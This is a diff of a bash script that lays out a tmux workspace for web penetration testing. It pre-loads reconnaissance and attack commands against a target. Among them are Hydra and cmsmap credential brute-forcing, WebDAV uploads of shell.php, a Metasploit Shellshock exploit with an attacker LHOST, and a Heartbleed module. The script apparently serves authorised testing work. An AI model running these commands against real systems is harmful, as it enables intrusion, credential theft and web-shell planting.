@@ -994,240 +994,228 @@ cd $folderProjectWebInfo
 tmux new-window -t PT:10 -n 'Information Gathering (WEB): Site Structure'
 tmux split-window -v -t PT:10.0  
 tmux split-window -v -t PT:10.1 
-tmux split-window -v -t PT:10.2 
-tmux split-window -v -t PT:10.3 
+tmux split-window -v -t PT:10.2  
 tmux select-pane -t "10.2"
 tmux split-window -h -t "10.2"
 tmux split-window -h -t "10.2"
+tmux split-window -v -t PT:10.5
 tmux select-pane -t "10.5"
 tmux split-window -h -t "10.5"
 # Esecuzione dei comandi nelle sottofinestre
 # WGET standard file
 tmux send-keys -t PT:10.0 "# get common file (robots, sitemap, ...)" Enter
-tmux send-keys -t PT:10.0 "wget ""http://$site/robots.txt"" ""http://$site/sitemap.xml"" ""http://$site/crossdomain.xml"" ""http://$site/phpinfo.php"" ""http://$site/index.php"" ""http://$site/index.html"" ""http://$site/README.md"" ""https://$site/robots.txt"" ""https://$site/sitemap.xml"" ""https://$site/crossdomain.xml"" ""https://$site/phpinfo.php"" ""https://$site/index.php"" ""https://$site/index.html"" ""https://$site/README.md""
-# Gobuster, dirsearch"
-tmux send-keys -t PT:10.1 "find /usr/share/seclists/ | grep dir | xargs wc -l  | sort -n # search dictionary"
-tmux send-keys -t PT:10.2 "# find site structure" Enter
-tmux send-keys -t PT:10.2 "# Remeber also that:" Enter
-tmux send-keys -t PT:10.2 "# 1. HTTP PUT -> webDav" Enter
-tmux send-keys -t PT:10.2 "# 2. /cgi-bin/file.cgi -> Shellshock" Enter
-tmux send-keys -t PT:10.2 "# 3. nginx con redirect da /asset a /asset/ -> nginx off by side" Enter
-tmux send-keys -t PT:10.2 "# site folder structure." Enter
-tmux send-keys -t PT:10.2 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
-tmux send-keys -t PT:10.3 "# if target site respond always 20x" Enter
-tmux send-keys -t PT:10.3 "fuff -u http://$site/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 2066"
-tmux send-keys -t PT:10.4 "# if target site respond always 30x" Enter
-tmux send-keys -t PT:10.4 "gobuster dir -u http://$site -x php,html -w /usr/share/wordlists/dirb/common.txt -b \"204,301,302,307,401,403\" # if target answer always 30x"
-tmux send-keys -t PT:10.5 "# dirsearch to find hidden folder (BIG search)" Enter
-tmux send-keys -t PT:10.5 "# find site structure" Enter
-tmux send-keys -t PT:10.5 "# Remeber also that:" Enter
-tmux send-keys -t PT:10.5 "# 1. HTTP PUT -> webDav" Enter
-tmux send-keys -t PT:10.5 "# 2. /cgi-bin/file.cgi -> Shellshock" Enter
-tmux send-keys -t PT:10.5 "# 3. nginx con redirect da /asset a /asset/ -> nginx off by side" Enter
-tmux send-keys -t PT:10.5 "dirsearch -u http://$site /usr/share/wordlists/dirb/big.txt"
-tmux send-keys -t PT:10.6 "# dirsearch to find hidden folder" Enter
-tmux send-keys -t PT:10.6 "# find site structure" Enter
-tmux send-keys -t PT:10.6 "# Remeber also that:" Enter
-tmux send-keys -t PT:10.6 "# 1. HTTP PUT -> webDav" Enter
-tmux send-keys -t PT:10.6 "# 2. /cgi-bin/file.cgi -> Shellshock" Enter
-tmux send-keys -t PT:10.6 "# 3. nginx con redirect da /asset a /asset/ -> nginx off by side" Enter
-tmux send-keys -t PT:10.6 "dirsearch -u http://$site"
+tmux send-keys -t PT:10.0 "wget ""http://$site/robots.txt"" ""http://$site/sitemap.xml"" ""http://$site/crossdomain.xml"" ""http://$site/phpinfo.php"" ""http://$site/index.php"" ""http://$site/index.html"" ""http://$site/README.md"" ""https://$site/robots.txt"" ""https://$site/sitemap.xml"" ""https://$site/crossdomain.xml"" ""https://$site/phpinfo.php"" ""https://$site/index.php"" ""https://$site/index.html"" ""https://$site/README.md"""
+tmux send-keys -t PT:10.1 "# find dictionary." Enter
+tmux send-keys -t PT:10.1 "find /usr/share/seclists/ | grep dir | xargs wc -l  | sort -n" 
+tmux send-keys -t PT:10.2 "# find folders" Enter
+tmux send-keys -t PT:10.2 "dirsearch -u http://$site /usr/share/wordlists/dirb/big.txt"
+tmux send-keys -t PT:10.3 "# find folders" Enter
+tmux send-keys -t PT:10.3 "dirsearch -u http://$site"
+tmux send-keys -t PT:10.4 "# find folders" Enter
+tmux send-keys -t PT:10.4 "gobuster dir -u https://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k"
+tmux send-keys -t PT:10.5 "# if target site respond always 20x" Enter
+tmux send-keys -t PT:10.5 "fuff -u http://$site/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 2066"
+tmux send-keys -t PT:10.6 "# if target site respond always 30x" Enter
+tmux send-keys -t PT:10.6 "gobuster dir -u http://$site -x php,html -w /usr/share/wordlists/dirb/common.txt -b \"204,301,302,307,401,403\" # if target answer always 30x"
 cd $folderProject
 
+# from Site Structure -> WEB DAV
+cd $folderProjectQucikWin
+# Layout
+tmux new-window -t PT:11 -n 'from Site Structure -> WEB DAV'
+tmux split-window -v -t PT:11.0
+tmux split-window -v -t PT:11.1
+tmux split-window -v -t PT:11.2
+tmux split-window -v -t PT:11.3
+tmux select-pane -t "11.3"
+tmux split-window -h -t "11.3"
+tmux split-window -h -t "11.3"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:11.0 "# Bruteforce attack to get Target Site Folders" Enter
+tmux send-keys -t PT:11.0 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
+tmux send-keys -t PT:11.1 "# Bruteforce attack to get credentials to specific folder" Enter
+tmux send-keys -t PT:11.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
+tmux send-keys -t PT:11.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
+tmux send-keys -t PT:11.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt http://$site wampp xampp"
+tmux send-keys -t PT:11.3 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:11.3 "cadaver $ip"
+tmux send-keys -t PT:11.4 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:11.4 "curl -T shell.txt -u login:password http://$ip"
+tmux send-keys -t PT:11.5 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:11.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
+cd $folderProject
 
-#------------------------------------------------
+# from site structure -> shellShock
+cd $folderProjectWebInfo
+# Layout
+tmux new-window -t PT:12 -n 'from site structure -> shellShock'
+tmux split-window -v -t PT:12.0
+tmux select-pane -t "12.0"
+tmux split-window -h -t "12.0"
+tmux split-window -v -t PT:12.2
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:12.0 "# Search for cgi file with dirsearch" Enter
+tmux send-keys -t PT:12.0 "dirsearch -u http://$site -w /usr/share/wordlists/dirb/big.txt"
+tmux send-keys -t PT:12.1 "# Search shellshock vulnerability with nikto" Enter
+tmux send-keys -t PT:12.1 "nikto -h $ip"
+tmux send-keys -t PT:12.2 "# Exploit shellshock with msfconsole" Enter
+tmux send-keys -t PT:12.2 "msfconsole -qx \"use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOST $ip; set TARGETURI /cgi-bin/test; set RPORT 80; set LHOST 192.168.1.11; run\""
+cd $folderProject
 
+# from site structure -> nginx off by side
+cd $folderProjectWebInfo
+# Layout
+tmux new-window -t PT:13 -n 'from site structure -> nginx off by side'
+tmux split-window -v -t PT:13.0
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:13.0 "# if find redirect from /asset to /asset/" Enter
+tmux send-keys -t PT:13.0 "dirsearch -u http://$site -w /usr/share/wordlists/dirb/big.txt"
+cd $folderProject
 
-
-
-
-
-
+# WEB File extension
+cd $folderProjectWebInfo
+# Layout
+tmux new-window -t PT:14 -n 'Information Gathering (WEB): WEB File Extension'
+tmux split-window -v -t PT:14.0
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:14.0 "# find files with multiple extension" Enter
+tmux send-keys -t PT:14.0 "wfuzz -c -w /usr/share/wordlists/dirb/common.txt -w /usr/share/wordlists/dirb/extensions_common.txt --sc 200 http://$site/FUZZFUZ2Z"
+cd $folderProject
 
 # WEB Metodi Attivi
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:4 -n 'WEB Metodi Attivi'
-tmux split-window -v -t PT:4.0
+tmux new-window -t PT:15 -n 'Information Gathering (WEB): Active web methods'
+tmux split-window -v -t PT:15.0
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:4.0 "# HTTP method allowed" Enter
-tmux send-keys -t PT:4.0 "URL=\"http://$site\"; for method in \"OPTIONS\" \"GET\" \"POST\" \"PUT\" \"DELETE\"; do echo \"Testing \$method method:\"; curl -X \$method -I \$URL; echo \"-------------------------\"; done"
+tmux send-keys -t PT:15.0 "# HTTP method allowed" Enter
+tmux send-keys -t PT:15.0 "URL=\"http://$site\"; for method in \"OPTIONS\" \"GET\" \"POST\" \"PUT\" \"DELETE\"; do echo \"Testing \$method method:\"; curl -X \$method -I \$URL; echo \"-------------------------\"; done"
 cd $folderProject
-
-
-# WEB Estensione File
-cd $folderProjectWebInfo
-# Layout
-tmux new-window -t PT:5 -n 'WEB Estensione File'
-tmux split-window -v -t PT:5.0
-# Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:5.0 "# find files with multiple extension" Enter
-tmux send-keys -t PT:5.0 "wfuzz -c -w /usr/share/wordlists/dirb/common.txt -w /usr/share/wordlists/dirb/extensions_common.txt --sc 200 http://$site/FUZZFUZ2Z"
-cd $folderProject
-
 
 # WEB API
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:6 -n 'WEB API'
-tmux split-window -v -t PT:6.0
-tmux select-pane -t "6.0"
-tmux split-window -h -t "6.0"
-tmux split-window -v -t PT:6.2
-tmux select-pane -t "6.2"
-tmux split-window -h -t "6.2"
-tmux split-window -v -t PT:6.4
-tmux split-window -v -t PT:6.5
+tmux new-window -t PT:16 -n 'Information Gathering (WEB): API analysis'
+tmux split-window -v -t PT:16.0
+tmux select-pane -t "16.0"
+tmux split-window -h -t "16.0"
+tmux split-window -v -t PT:16.2
+tmux select-pane -t "16.2"
+tmux split-window -h -t "16.2"
+tmux split-window -v -t PT:16.4
+tmux select-pane -t "16.4"
+tmux split-window -h -t "16.4"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:6.0 "# find kr dictionary" Enter
-tmux send-keys -t PT:6.0 "/opt/kr wordlist list"
-tmux send-keys -t PT:6.1 "# find endPoint with kr" Enter
-tmux send-keys -t PT:6.1 "/opt/kr scan http://$site -A httparchive_apiroutes_2023_10_28.txt # find endpoint auto"
-tmux send-keys -t PT:6.2 "# find endPoint with wfuzz" Enter
-tmux send-keys -t PT:6.2 "wfuzz -X POST -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$site/api/v1/FUZZ --hc 403,404"
-tmux send-keys -t PT:6.3 "# find endPoint with fuff" Enter
-tmux send-keys -t PT:6.3 "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$site/api/v1/FUZZ "
-tmux send-keys -t PT:6.4 "# analyze Data Parameter with curl " Enter
-tmux send-keys -t PT:6.4 "curl -X POST -H 'Content-type: application/json' -x http://$site/api/v1/user -d '{""user"":""admin"",""pass"",""password""}'"
-tmux send-keys -t PT:6.5 "# analyze Data Parameter with fuff " Enter
-tmux send-keys -t PT:6.5 "ffuf -request request.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt"
-
+tmux send-keys -t PT:16.0 "# find endPoint with kr - dictionary" Enter
+tmux send-keys -t PT:16.0 "/opt/kr wordlist list"
+tmux send-keys -t PT:16.1 "# find endPoint with kr - execute command" Enter
+tmux send-keys -t PT:16.1 "/opt/kr scan http://$site -A httparchive_apiroutes_2023_10_28.txt # find endpoint auto"
+tmux send-keys -t PT:16.2 "# find endPoint with wfuzz" Enter
+tmux send-keys -t PT:16.2 "wfuzz -X POST -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$site/api/v1/FUZZ --hc 403,404"
+tmux send-keys -t PT:16.3 "# find endPoint with fuff" Enter
+tmux send-keys -t PT:16.3 "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$site/api/v1/FUZZ "
+tmux send-keys -t PT:16.4 "# find Data Parameter with curl " Enter
+tmux send-keys -t PT:16.4 "curl -X POST -H 'Content-type: application/json' -x http://$site/api/v1/user -d '{""user"":""admin"",""pass"",""password""}'"
+tmux send-keys -t PT:16.5 "# find Data Parameter with fuff " Enter
+tmux send-keys -t PT:16.5 "ffuf -request request.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt"
 
 # Guessing GET / POST Parameter
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:7 -n 'Guessing GET/POST param'
-tmux split-window -v -t PT:7.0
-tmux split-window -v -t PT:7.1
-tmux split-window -v -t PT:7.2
-tmux split-window -v -t PT:7.3
+tmux new-window -t PT:17 -n 'Information Gathering (WEB): Guessing GET/POST param'
+tmux split-window -v -t PT:17.0
+tmux split-window -v -t PT:17.1
+tmux split-window -v -t PT:17.2
+tmux split-window -v -t PT:17.3
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:7.0 "# find a valid parameter (GET)" Enter
-tmux send-keys -t PT:7.0 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://$site/action.php?FUZZ=test"
-tmux send-keys -t PT:7.1 "# find a valid value (GET)" Enter
-tmux send-keys -t PT:7.1 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://$site/action.php?Param1=FUZZ"
-tmux send-keys -t PT:7.2 "# find a valid parameter (POST)" Enter
-tmux send-keys -t PT:7.2 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d "name=dok&FUZZ=1" http://$site/action.php"
-tmux send-keys -t PT:7.3 "# find a valid value (POST)" Enter
-tmux send-keys -t PT:7.3 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d "name=dok&Param1=FUZZ" http://$site/action.php"
-
-
-
-
-
-
-
-
+tmux send-keys -t PT:17.0 "# find a valid parameter (GET)" Enter
+tmux send-keys -t PT:17.0 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://$site/action.php?FUZZ=test"
+tmux send-keys -t PT:17.1 "# find a valid value (GET)" Enter
+tmux send-keys -t PT:17.1 "wfuzz --hh=24 -c  -w /usr/share/dirb/wordlists/big.txt http://$site/action.php?Param1=FUZZ"
+tmux send-keys -t PT:17.2 "# find a valid parameter (POST)" Enter
+tmux send-keys -t PT:17.2 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d \"name=dok&FUZZ=1\" http://$site/action.php"
+tmux send-keys -t PT:17.3 "# find a valid value (POST)" Enter
+tmux send-keys -t PT:17.3 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d \"name=dok&Param1=FUZZ\" http://$site/action.php"
 
 # WEB Analisi del certificato HTTPS
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:12 -n 'WEB Certificato HTTPS'
-tmux split-window -v -t PT:12.0
-tmux split-window -v -t PT:12.1
+tmux new-window -t PT:18 -n 'Information Gathering (WEB): WEB Certificate analysis and verify heartbleed'
+tmux split-window -v -t PT:18.0
+tmux split-window -v -t PT:18.1
+tmux split-window -v -t PT:18.2
+tmux select-pane -t "18.2"
+tmux split-window -h -t "18.2"
+tmux split-window -h -t "18.2"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:12.0 "# SSL analysis with sslscan" Enter
-tmux send-keys -t PT:12.0 "sslscan $ip"
-tmux send-keys -t PT:12.1 "# certificate analysis" Enter
-tmux send-keys -t PT:12.1 "openssl s_client -connect $site:443 </dev/null 2>/dev/null | openssl x509 -out $site.crt; echo \"Certificato scaricato: $site.crt\" # get certificate info"
+tmux send-keys -t PT:18.0 "# SSL certificate analysis with sslscan" Enter
+tmux send-keys -t PT:18.0 "sslscan https://$site"
+tmux send-keys -t PT:18.1 "# SSL certificate download" Enter
+tmux send-keys -t PT:18.1 "openssl s_client -connect $site:443 </dev/null 2>/dev/null | openssl x509 -out $site.crt; echo \"Certificato scaricato: $site.crt\" # get certificate info"
+tmux send-keys -t PT:18.2 "# heartbleed analysis with sslyze" Enter
+tmux send-keys -t PT:18.2 "sslyze -heartbleed $ip"
+tmux send-keys -t PT:18.3 "# heartbleed analysis with nmap" Enter
+tmux send-keys -t PT:18.3 "nmap -p 443 -sV --script=ssl-heartbleed $ip"
+tmux send-keys -t PT:18.4 "# heartbleed analysis with sslscan" Enter
+tmux send-keys -t PT:18.4 "sslscan https://$site"
 cd $folderProject
 
-
-
-
-# openssl_heartbleed
+# Exploit heartbleed
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:14 -n 'openssl_heartbleed'
-tmux split-window -v -t PT:14.0
-tmux split-window -v -t PT:14.1
-tmux split-window -v -t PT:14.2
-tmux split-window -v -t PT:14.3
+tmux new-window -t PT:19 -n 'Information Gathering (WEB): Exploit heartbleed'
+tmux split-window -v -t PT:19.0
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:14.0 "# verify heartbleed with nmap" Enter
-tmux send-keys -t PT:14.0 "nmap -p 443 -sV --script=ssl-heartbleed $ip"
-tmux send-keys -t PT:14.0 "# verify heartbleed with sslyze" Enter
-tmux send-keys -t PT:14.0 "sslyze --heartbleed $ip"
-tmux send-keys -t PT:14.0 "# verify heartbleed with sslscan" Enter
-tmux send-keys -t PT:14.0 "sslscan $ip"
-tmux send-keys -t PT:14.1 "# attack target by means of heartbleed" Enter
-tmux send-keys -t PT:14.1 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;\""
+tmux send-keys -t PT:19.0 "# Exploit heartbleed" Enter
+tmux send-keys -t PT:19.0 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;\""
 cd $folderProject
-
 
 # CMS: Joomla, wordpress, drupal & co
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:15 -n 'CMS: Joomla, wordpress, drupal & co'
-tmux split-window -v -t PT:15.0
-tmux split-window -v -t PT:15.1
-tmux split-window -v -t PT:15.2
-tmux split-window -v -t PT:15.3
-tmux select-pane -t "15.0"
-tmux split-window -h -t "15.0"
-tmux split-window -h -t "15.0"
-tmux select-pane -t "15.3"
-tmux split-window -h -t "15.3"
-tmux split-window -h -t "15.3"
-tmux split-window -h -t "15.3"
-tmux select-pane -t "15.7"
-tmux split-window -h -t "15.7"
-tmux split-window -h -t "15.7"
-tmux split-window -h -t "15.7"
-tmux select-pane -t "15.11"
-tmux split-window -h -t "15.11"
+tmux new-window -t PT:20 -n 'Information Gathering (WEB): CMS Joomla, wordpress, drupal'
+tmux split-window -v -t PT:20.0
+tmux split-window -v -t PT:20.1
+tmux split-window -v -t PT:20.2
+tmux split-window -v -t PT:20.3
+tmux select-pane -t "20.0"
+tmux split-window -h -t "20.0"
+tmux split-window -h -t "20.0"
+tmux select-pane -t "20.3"
+tmux split-window -h -t "20.3"
+tmux split-window -h -t "20.3"
+tmux split-window -h -t "20.3"
+tmux select-pane -t "20.7"
+tmux split-window -h -t "20.7"
+tmux split-window -h -t "20.7"
+tmux split-window -h -t "20.7"
+tmux select-pane -t "20.11"
+tmux split-window -h -t "20.11"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:15.0 "# update (if necessary) scan tools" Enter
-tmux send-keys -t PT:15.0 "wpscan --update; joomscan update; cmsmap http://$site --update"
-tmux send-keys -t PT:15.1 "# whatweb analysis of target site" Enter
-tmux send-keys -t PT:15.1 "whatweb -a 3 http://$site"
-tmux send-keys -t PT:15.2 "# cmsmap to scan target" Enter
-tmux send-keys -t PT:15.2 "cmsmap http://$site -F"
-tmux send-keys -t PT:15.3 "# wordpress scan with nmap analysis" Enter
-tmux send-keys -t PT:15.3 "nmap -Pn -vv -p 80 --script=http-wordpress* $ip -oA out.wp"
-tmux send-keys -t PT:15.4 "# wpscan with principal plugins and themes" Enter
-tmux send-keys -t PT:15.4 "wpscan --url http://$site --enumerate p,t,cb,dbe,u --plugins-detection aggressive --api-token $wptoken -o wpscan.txt [--disable-tls-checks]"
-tmux send-keys -t PT:15.5 "# wpscan with all plugins and themes" Enter
-tmux send-keys -t PT:15.5 "wpscan --url http://$site --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --api-token $wptoken  -o wpscanALL.txt[--disable-tls-checks]"
-tmux send-keys -t PT:15.6 "# cmsmap bruteforceCMS" Enter
-tmux send-keys -t PT:15.6 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
-tmux send-keys -t PT:15.7 "# joomscam target site" Enter
-tmux send-keys -t PT:15.7 "joomscan -u http://$site"
-tmux send-keys -t PT:15.8 "# msfconsole to test joomla target site" Enter
-tmux send-keys -t PT:15.8 "msfconsole -q -x \"use auxiliary/scanner/http/joomla_plugins;set RHOSTS $ip;set THREADS 5;run\""
-tmux send-keys -t PT:15.9 "# juumla to test joomla target site" Enter
-tmux send-keys -t PT:15.9 "python /opt/juumla/main.py -u http://$site"
-tmux send-keys -t PT:15.10 "# cmsmap bruteforce" Enter
-tmux send-keys -t PT:15.10 "sudo cmsmap https://$site -u ../users.txt -p ../passwords.txt -f J"
-tmux send-keys -t PT:15.11 "# scan drupal site with droopescan" Enter
-tmux send-keys -t PT:15.11 "droopescan scan drupal -u http://$site -t 32"
-cd $folderProject
-
-
-# WEB DAV
-cd $folderProjectQucikWin
-# Layout
-tmux new-window -t PT:16 -n 'from Site Structure -> WEB DAV'
-tmux split-window -v -t PT:16.0
-tmux split-window -v -t PT:16.1
-tmux split-window -v -t PT:16.2
-tmux split-window -v -t PT:16.3
-tmux select-pane -t "16.3"
-tmux split-window -h -t "16.3"
-tmux split-window -h -t "16.3"
-# Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:16.0 "# Bruteforce attack to get Target Site Folders" Enter
-tmux send-keys -t PT:16.0 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
-tmux send-keys -t PT:16.1 "# Bruteforce attack to get credentials to specific folder" Enter
-tmux send-keys -t PT:16.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
-tmux send-keys -t PT:16.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
-tmux send-keys -t PT:16.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt http://$site wampp xampp"
-tmux send-keys -t PT:16.3 "# upload file to webDAV folder" Enter
-tmux send-keys -t PT:16.3 "cadaver $ip"
-tmux send-keys -t PT:16.4 "# upload file to webDAV folder" Enter
-tmux send-keys -t PT:16.4 "curl -T shell.txt -u login:password http://$ip"
-tmux send-keys -t PT:16.5 "# upload file to webDAV folder" Enter
-tmux send-keys -t PT:16.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
+tmux send-keys -t PT:20.0 "# update (if necessary) scan tools" Enter
+tmux send-keys -t PT:20.0 "wpscan --update; joomscan update; cmsmap http://$site --update"
+tmux send-keys -t PT:20.1 "# whatweb analysis of target site" Enter
+tmux send-keys -t PT:20.1 "whatweb -a 3 http://$site"
+tmux send-keys -t PT:20.2 "# cmsmap to scan target" Enter
+tmux send-keys -t PT:20.2 "cmsmap http://$site -F"
+tmux send-keys -t PT:20.3 "# wordpress scan with nmap analysis" Enter
+tmux send-keys -t PT:20.3 "nmap -Pn -vv -p 80 --script=http-wordpress* $ip -oA out.wp"
+tmux send-keys -t PT:20.4 "# wpscan with principal plugins and themes" Enter
+tmux send-keys -t PT:20.4 "wpscan --url http://$site --enumerate p,t,cb,dbe,u --plugins-detection aggressive --api-token $wptoken -o wpscan.txt [--disable-tls-checks]"
+tmux send-keys -t PT:20.5 "# wpscan with all plugins and themes" Enter
+tmux send-keys -t PT:20.5 "wpscan --url http://$site --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --api-token $wptoken  -o wpscanALL.txt[--disable-tls-checks]"
+tmux send-keys -t PT:20.6 "# cmsmap bruteforceCMS" Enter
+tmux send-keys -t PT:20.6 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
+tmux send-keys -t PT:20.7 "# joomscam target site" Enter
+tmux send-keys -t PT:20.7 "joomscan -u http://$site"
+tmux send-keys -t PT:20.8 "# msfconsole to test joomla target site" Enter
+tmux send-keys -t PT:20.8 "msfconsole -q -x \"use auxiliary/scanner/http/joomla_plugins;set RHOSTS $ip;set THREADS 5;run\""
+tmux send-keys -t PT:20.9 "# juumla to test joomla target site" Enter
+tmux send-keys -t PT:20.9 "python /opt/juumla/main.py -u http://$site"
+tmux send-keys -t PT:20.10 "# cmsmap bruteforce" Enter
+tmux send-keys -t PT:20.10 "sudo cmsmap https://$site -u ../users.txt -p ../passwords.txt -f J"
+tmux send-keys -t PT:20.11 "# scan drupal site with droopescan" Enter
+tmux send-keys -t PT:20.11 "droopescan scan drupal -u http://$site -t 32"
 cd $folderProject
 
 
